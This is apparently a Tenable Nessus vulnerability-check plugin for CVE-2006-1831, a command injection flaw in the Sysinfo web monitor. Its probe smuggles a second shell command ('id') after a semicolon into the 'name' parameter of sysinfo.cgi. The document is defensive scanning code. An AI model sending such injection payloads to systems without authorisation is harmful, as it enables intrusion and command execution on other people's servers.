#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21237);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2006-1831");
  script_bugtraq_id(17523);
  script_osvdb_id(24648);

  script_name(english:"Sysinfo name Parameter Arbitrary Code Execution");
  script_summary(english:"Tries to execute arbitrary code using Sysinfo");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Perl script that is susceptible to
arbitrary command execution attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sysinfo, a web-based system monitor. 

The version of Sysinfo installed on the remote host fails to sanitize
user-supplied input to the 'name' parameter before passing it to a
shell for execution.  An unauthenticated attacker may be able to
exploit this issue to execute arbitrary shell commands on the remote
host subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://downloads.securityfocus.com/vulnerabilities/exploits/sysinfo_poc" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Sysinfo version 2.25 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/14");
 script_cvs_date("$Date: 2012/12/20 19:22:43 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:coder-world:sysinfo");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/cgi-bin/sysinfo", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw.
  #
  # nb: this won't actually return any command output but cmd must
  #     be a valid command.
  cmd = "id";
  exploit = string(SCRIPT_NAME, ";", cmd);
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/sysinfo.cgi?",
      "action=systemdoc&",
      "name=", exploit
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if it looks like the name value was accepted.
  if (string("Dokumentation von ", exploit) >< res)
  {
    security_hole(port);
    exit(0);
  }
}
